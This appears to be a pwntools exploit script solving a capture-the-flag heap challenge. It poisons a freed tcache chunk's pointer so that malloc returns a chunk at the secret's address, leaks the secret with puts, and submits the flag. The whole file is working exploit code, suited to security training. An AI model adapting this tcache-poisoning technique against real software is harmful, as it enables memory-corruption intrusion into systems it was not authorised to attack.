#!/usr/bin/env python3
from pwn import *

PORT = 0000
HOST = "000000000"
elf = context.binary = ELF('/challenge/seeking-spanless-secrets-hard', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            set resolve-heap-via-heuristic force
            b* 0x00000000004018F8
            b* 0x00000000004019B7
            b* 0x0000000000401A76
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

prompt = b"Function (malloc/free/puts/scanf/send_flag/quit): "

def sla(pr, dt): p.sendlineafter(pr, dt)
def sa(pr, dt): p.sendafter(pr, dt)

def malloc(idx, sz):
    sla(prompt, b'malloc')
    sla(b'Index: ', str(idx).encode())
    sla(b'Size: ', str(sz).encode())

def free(idx):
    sla(prompt, b'free')
    sla(b'Index: ', str(idx).encode())

def puts(idx):
    sla(prompt, b'puts')
    sla(b'Index: ', str(idx).encode())

def scanf(idx, dt):
    sla(prompt, b'scanf')
    sla(b'Index: ', str(idx).encode())
    p.sendline(dt)

def send_flag(dt):
    sla(prompt, b'send_flag')
    sla(b'Secret: ', dt)

secret = 0x427D0A - 0x10

malloc(0, 0x20)
malloc(1, 0x20)

free(0)
free(1)
scanf(1, p64(secret))

malloc(2, 0x20)
malloc(3, 0x20)
scanf(3, b'a'*0x30)
# GDB()
puts(3)
send_flag(b'a'*0x16)

p.interactive()